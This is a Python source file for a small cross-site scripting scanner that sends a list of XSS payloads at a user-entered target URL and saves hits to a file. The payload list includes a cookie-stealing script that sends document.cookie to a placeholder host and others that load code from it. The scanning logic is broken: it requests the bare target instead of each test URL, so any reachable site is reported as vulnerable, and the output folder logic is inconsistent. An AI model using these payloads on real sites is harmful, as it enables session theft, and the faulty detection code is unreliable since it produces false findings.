import requests
import os
import random
import asyncio
from colorama import Fore, init
from urllib.parse import urlparse
from pathlib import Path
from web_scaner.Header import user_agent_list

init()

XSS_PYLODS = [
    "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')", "<svg onload=alert('XSS')>", "<body onload=alert('XSS')>",
    r"\"'><script>alert('XSS')</script>", "<script src='http://malicious.com'></script>",
    "<input type='text' value='><script>alert('XSS')</script>'",
    r"<ScRiPt>alert('XSS')</ScRiPt>", "%3Cscript%3Ealert('XSS')%3C/script%3E",
    r"<img src='javascript:alert(\"XSS\")'>", "<a href='javascript:alert(1)'>click</a>",
    r"<iframe src='javascript:alert(\"XSS\")'></iframe>", "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<div onmouseover='alert(1)'>hover</div>", "<script>document.write('XSS')</script>",
    "<input type='text' onfocus='alert(1)'>", "<img src=x oneonerror=alert('XSS')>",
    "<script>fetch('http://malicious.com')</script>", "<object data='javascript:alert(1)'></object>",
    "<embed src='javascript:alert(1)'>", "<script>new Image().src='http://malicious.com/log?'+document.cookie</script>"
]

class XssScanner:
        
    async def raquest(self, url):
        try:
            return requests.get(
                            url,
                            headers={"User-Agent":random.choice(user_agent_list)}, 
                            timeout=5
                        )
        except requests.exceptions.RequestException:
            return None

    def xss_scan(self, target_url):
        result = []
        
        for line in XSS_PYLODS:
            test_url = f"{target_url}/{line.strip()}"

            respons = asyncio.run(self.raquest(target_url))
            
            if respons and respons.status_code == 200:
                result.append(test_url)
        
        if result:      
            result_folder = os.path.join(Path.home(), "Desktop", "result", "XssScaner")
            os.makedirs("result", exist_ok=True)
            
        # hna radi nbdale colxi
            all_path_result_file = os.path.join(result_folder, f'{urlparse(target_url).netloc}.txt')
            with open(all_path_result_file, "w", encoding="utf-8", errors="ignore") as files:
                files.write("\n".join(str(x) for x in result))
    
    def main(self):
        import sys
        
        limit = 0
        while limit != 5:
            try:
                target_url = input(Fore.LIGHTBLACK_EX+"\n[+]"+Fore.LIGHTWHITE_EX+" Enter The Target 'URL OR IP' >> ")
            except KeyboardInterrupt:
                check_except = input(Fore.LIGHTGREEN_EX+"\n[-]"+Fore.LIGHTWHITE_EX+"If Wanna Exit Press Key 'exit' OR 'No' >> ").lower().strip()
                if check_except == "exit":
                    sys.exit(0)
                else:
                    continue
            
            if not target_url:
                print(Fore.LIGHTRED_EX+"[-]"+Fore.LIGHTWHITE_EX+"Pless Enter The 'URL OR IP'")
                limit+=1
                continue
            
            self.xss_scan(target_url.strip())
            
if __name__ == "__main__":
    pass